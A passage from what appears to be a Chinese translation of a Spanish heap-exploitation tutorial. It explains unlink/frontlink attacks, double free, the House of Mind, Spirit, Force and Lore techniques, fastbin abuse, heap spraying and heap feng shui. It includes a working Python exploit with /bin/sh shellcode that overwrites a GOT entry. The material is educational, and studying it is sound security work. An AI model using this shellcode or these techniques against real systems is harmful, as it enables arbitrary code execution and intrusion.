因此，如果我们成功修改了P->bk为shellcode的地址，并将P->fd修改为GOT或DTORS中的地址减去12，则可以实现：

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

这样，在程序退出时将执行shellcode。

此外，unlink()的第四条语句会写入一些内容，因此shellcode必须进行修复：

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) —> 这将导致从shellcode的第8个字节开始写入4个字节，因此shellcode的第一条指令必须是跳转指令以跳过此内容并进入一系列nop指令，最终执行shellcode。

因此，利用程序：

在buffer1中插入shellcode，以跳转指令开头，使其跳转到nop或shellcode的其余部分。

在shellcode之后插入填充，直到达到下一个块的prev\_size和size字段。在这些位置上插入0xfffffff0（用于覆盖prev\_size以设置空闲位）和“-4”（0xfffffffc）在size中（以便在第三个块中检查第二个块是否为空闲时实际上转到修改后的prev\_size，告诉它第二个块是空闲的） -> 因此，当free()调查时，它将转到第三个块的size，但实际上将转到第二个块 - 4，并认为第二个块是空闲的。然后调用**unlink()**。

调用unlink()时，将第二个块的前几个数据用作P->fd，因此将在那里插入要覆盖的地址 - 12（因为在FD->bk中将地址加上12）。并在该地址中插入第二个块中找到的第二个地址，这应该是shellcode的地址（伪造的P->bk）。

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo está libre esté a 1**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, para que piense que el “size” del 3º trozo está 4bytes detrás (apunta a prev\_size) pues es ahí donde mira si el 2º trozo está libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Dirección de free() en la plt-12 (será la dirección que se sobrescrita para que se lanza la shellcode la 2º vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque sí**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2º trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

控制3个连续的chunks，并按相反顺序释放。

在chunk c中放置shellcode

使用chunk a来覆盖b，使size的PREV\_INUSE位被禁用，使程序认为chunk a是空闲的。

此外，在头部b中覆盖size，使其值为-4。

然后，程序会认为“a”是空闲的并且在一个bin中，因此会调用unlink()来解除链接。但是，由于头部PREV\_SIZE值为-4，程序会认为“a”块实际上从b+4开始。也就是说，它会对从b+4开始的块执行unlink()，因此在b+12处将是指针“fd”，在b+16处将是指针“bk”。

因此，如果在bk中放入shellcode的地址，并在fd中放入函数“puts()”-12的地址，我们就有了payload。

**Frontlink技术**

当释放某个块时，其相邻块均未空闲，不会调用unlink()，而是直接调用frontlink()。

这是一个有用的漏洞，当攻击的malloc从不被释放（free()）时。

需要：

一个可以通过数据输入函数溢出的缓冲区

一个与此相邻的缓冲区，应该被释放，并且通过前一个缓冲区的溢出将其头部的fd字段修改

一个要释放的缓冲区，其大小大于512但小于前一个缓冲区

在第3步之前声明的一个缓冲区，允许覆盖其prev\_size

通过这种方式，通过无序地控制两个malloc，并且通过控制一个仅释放一个的malloc，我们可以进行利用。

**双重free()漏洞**

如果两次使用相同指针调用free()，则会有两个bin指向相同地址。

如果要重新使用一个，可以轻松分配。如果要使用另一个，则将分配相同的空间，因此我们将具有伪造的“fd”和“bk”指针，这些指针是由前一个保留写入的数据伪造的。

**After free()**

先前释放的指针被再次无控制地使用。

## **8堆溢出：高级利用**

Unlink()和FrontLink()技术在修改unlink()函数后被删除。

**The house of mind**

只需调用一次free()即可触发任意代码执行。有助于查找第二个块，可以被前一个块溢出并释放。

调用free()会调用public\_fREe(mem)，它执行以下操作：

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> 返回指向块开头的指针（mem-8）

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

在\[1]中检查size字段的NON\_MAIN\_ARENA位，可以更改此检查以返回true并执行heap\_for\_ptr()，该函数对“mem”进行与操作，将最不重要的2.5字节设置为0（例如，从0x0804a000中得到0x08000000），然后访问0x08000000->ar\_ptr（就像是一个heap\_info结构体）

因此，如果我们可以控制一个块，例如在0x0804a000处，并且将要释放0x081002a0处的块，我们可以到达0x08100000地址并写入我们想要的内容，例如0x0804a000。当释放第二个块时，heap\_for\_ptr()将返回0x08100000地址（因为它应用于0x081002a0的与操作，从中提取前4个字节的值，ar\_ptr）

因此，调用\_int\_free(ar\_ptr, mem)，即\_int\_free(0x0804a000, 0x081002a0)\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

如前所述，我们可以控制av的值，因为这是我们在要释放的块中写入的内容。

正如unsorted\_chunks所定义的那样，我们知道：\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

因此，如果我们在av->bins\[2]中写入\_\_DTOR\_END\_\_-12的值，最后一条指令将在\_\_DTOR\_END\_\_中写入第二个块的地址。

也就是说，在第一个块中，我们需要在开头多次放置\_\_DTOR\_END\_\_-12的地址，因为av->bins\[2]将从那里获取值。

在第二个块中，借助第一个块，我们将prev\_size覆盖为jump 0x0c，size为某个值以激活-> NON\_MAIN\_ARENA

然后，在第二个块中放置大量的nops，最后是shellcode

这样将调用\_int\_free(TROZO1, TROZO2)，并按照指令将\_\_DTOR\_END\_\_中的地址设置为TROZO2的prev\_size，它将跳转到shellcode。

要应用此技术，需要满足一些额外要求，这使得payload稍微复杂化。
这种技术已经不适用，因为几乎应用了与unlink相同的补丁。它比较新指向的位置是否也指向它。

**Fastbin**

它是The house of mind的一个变体

我们希望执行以下代码，通过\_int\_free()函数的第一个检查后到达：

fb = &(av->fastbins\[fastbin\_index(size)] —> 其中fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

这样，如果将“fb”设置为GOT中的一个函数的地址，然后在该地址中放置被覆盖的地址。为此，需要使堆区域接近dtors的地址。更准确地说，av->max\_fast应该是我们将要覆盖的地址。

由于The House of Mind中我们发现我们控制了av的位置。

因此，如果在size字段中放入一个大小为8 + NON\_MAIN\_ARENA + PREV\_INUSE的值，fastbin\_index()将返回fastbins\[-1]，它将指向av->max\_fast。

在这种情况下，av->max\_fast将被覆盖（不是指向的地址，而是该位置将被覆盖）。

此外，释放的相邻块的大小必须大于8 -> 因为我们已经说过释放块的大小为8，在这个虚假块中，我们只需要放置一个大于8的大小（因为shellcode将放在释放的块中，因此需要在虚假块的size字段之后放置一个跳转到nops的jmp指令）。

此外，该虚假块的大小必须小于av->system\_mem。av->system\_mem在该地址的后面1848字节。

由于\_DTOR\_END\_中的空值和GOT中的少量地址，这些部分的任何地址都不适合被覆盖，因此让我们看看如何应用fastbin来攻击堆栈。

另一种攻击方式是将**av**重定向到堆栈。

如果我们将size修改为16而不是8，则fastbin\_index()将返回fastbins\[0]，我们可以利用这一点来覆盖堆栈。

为此，堆栈中不应该有任何canary或奇怪的值，实际上我们必须处于以下状态：4个空字节 + EBP + RET

需要这4个空字节是因为**av**将指向这个地址，而**av**的第一个元素是必须为0的mutex。

**av->max\_fast**将是EBP，并且将是一个值，可用于绕过限制。

**av->fastbins\[0]**将被覆盖为**p**的地址，并且将成为RET，从而跳转到shellcode。

此外，在**av->system\_mem**（在堆栈位置之上1484字节）将有足够的垃圾，可帮助我们绕过检查。

此外，释放的相邻块的大小必须大于8 -> 因为我们已经说过释放块的大小为16，在这个虚假块中，我们只需要放置一个大于8的大小（因为shellcode将放在释放的块中，因此需要在虚假块的size字段之后放置一个跳转到nops的jmp指令）。

**The House of Spirit**

在这种情况下，我们希望有一个指向malloc的指针，该指针可以被攻击者更改（例如，该指针位于堆栈上，可能在变量溢出下方）。

因此，我们可以使该指针指向任何地方。然而，并非所有位置都是有效的，虚假块的大小必须小于av->max\_fast，并且更具体地等于未来malloc()调用请求的大小加8。因此，如果我们知道在此脆弱指针之后会调用malloc(40)，则虚假块的大小必须等于48。

例如，如果程序要求用户输入一个数字，我们可以输入48，并将可修改的malloc指针指向接下来的4个字节（幸运的话，这些字节可能属于EBP，因此48将留在后面，就像是size头部）。此外，ptr-4+48的地址必须满足几个条件（在这种情况下ptr=EBP），即8 < ptr-4+48 < av->system\_mem。

如果这些条件满足，当调用我们说过的下一个malloc，即malloc(40)时，将把EBP的地址分配给它。如果攻击者还可以控制写入此malloc的内容，则可以覆盖EBP和EIP的地址为所需的地址。

我认为这是因为这样，当调用free()释放时，它会保存指向堆栈EBP处有一个完美大小的新malloc()块的地址，因此将分配该地址。

**The House of Force**

需要：

* 一个允许覆盖wilderness的溢出块
* 使用用户定义大小调用malloc()
* 调用malloc()的数据可以由用户定义

首先要做的是用一个非常大的值（0xffffffff）覆盖wilderness块的大小，这样任何足够大的内存请求都将在\_int\_malloc()中处理，而无需扩展堆。

其次是修改av->top，使其指向攻击者控制的内存区域，如堆栈。在av->top中，将放置\&EIP - 8。

我们必须覆盖av->top，使其指向攻击者控制的内存区域：

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim获取当前wilderness块的地址（当前av->top）的值，remainder正好是该地址加上malloc()请求的字节数。因此，如果\&EIP-8在0xbffff224处，av->top包含0x080c2788，则我们必须在受控的malloc中保留的字节数为3086207644，以便av->top指向$EIP-8，以供下一个malloc()使用。

重要的是新wilderness块的大小要大于最后一个malloc()请求的大小。也就是说，如果wilderness指向\&EIP-8，则大小将正好位于堆栈的EBP字段中。

**The House of Lore**

**SmallBin Corruption**

释放的块根据其大小放入相应的bin中。但在放入之前，它们会被保存在unsorted bins中。释放块不会立即放入其bin中，而是留在unsorted bins中。然后，如果分配新块且先前释放的块可用，则将其返回，但如果分配更大的块，则将unsorted bins中的释放块放入适当的bin中。

要达到易受攻击的代码，内存请求必须大于av->max\_fast（通常为72）且小于MIN\_LARGE\_SIZE（512）。

如果bin中有一个大小适当的块可用，则在解除链接后返回该块：

bck = victim->bk; 指向前一个块，这是我们唯一可以更改的信息。

bin->bk = bck; 倒数第二个块变为最后一个块，如果bck指向堆栈，则下一个分配的块将获得此地址

bck->fd = bin; 通过使其指向bin来关闭列表

需要：
### 基本的堆溢出技术

- 预留两个`malloc`，使第一个可以在第二个被释放并进入其 bin 后发生溢出（即在溢出之前分配一个比第二个块更大的 `malloc`）
- 由攻击者选择的地址控制被分配的 `malloc`

攻击目标如下：如果我们可以对一个堆进行溢出，而该堆下面有一个已被释放并进入其 bin 的块，我们可以修改其指针 `bk`。如果修改了 `bk` 指针，并且该块成为 bin 列表中的第一个块并被分配，bin 将被欺骗，并告诉它列表的最后一个块（下一个要提供的块）位于我们设置的虚假地址（例如堆栈或 GOT）。因此，如果再次分配另一个块并且攻击者对其具有权限，则将在所需位置给出一个块，并且可以在其中写入。

在修改的块被释放后，需要分配一个比释放的块更大的块，这样修改的块将离开 unsorted bins 并进入其 bin。

一旦进入其 bin，就是修改溢出以使其指针 `bk` 指向我们想要覆盖的地址的时候。

因此，bin 必须等待足够多次调用 `malloc()`，以便再次使用修改后的 bin 并欺骗 bin 让其相信下一个块位于虚假地址。然后将提供我们感兴趣的块。

为了尽快执行漏洞，理想情况下是：预留易受攻击的块，预留将被修改的块，释放此块，预留比将被修改的块更大的块，修改块（漏洞），预留与受攻击块大小相同的块，并预留第二个与受攻击块大小相同的块，这将指向所选地址。

为了保护此攻击，使用了典型的“不是”块检查：检查 `bck->fd` 是否指向 victim。也就是说，在我们的情况下，如果堆栈中指向 victim 的伪块的 `fd*` 指针指向 victim。要绕过此保护，攻击者必须能够以某种方式（可能通过堆栈）在适当地址写入 victim 的地址。以便看起来像一个真实的块。

### 大型 Bin 破坏

需要与之前相同的要求以及一些额外要求，此外，预留的块大小必须大于 512。

攻击与之前类似，即需要修改 `bk` 指针并需要所有这些对 `malloc()` 的调用，但还需要修改已修改块的大小，使得 `size - nb` 小于 `MINSIZE`。

例如，将大小设置为 1552，使得 1552 - 1544 = 8 < `MINSIZE`（减法不能为负，因为将无符号数进行比较）。

此外，还引入了一个补丁，使其更加复杂。

### 堆喷射

基本上是预留尽可能多的堆内存，并用以 shellcode 结尾的 nop 垫填充这些内存。此外，将 0x0c 用作垫。因此，将尝试跳转到地址 0x0c0c0c0c，因此如果覆盖了将使用此垫进行调用的任何地址，将跳转到那里。基本上策略是尽可能多地预留内存，以查看是否覆盖了任何指针并跳转到 0x0c0c0c0c，希望那里有 nop。

### 堆风水

通过预留和释放来巩固内存，使得在空闲块之间留下已预留的块。要溢出的缓冲区将位于其中一个空闲块中。
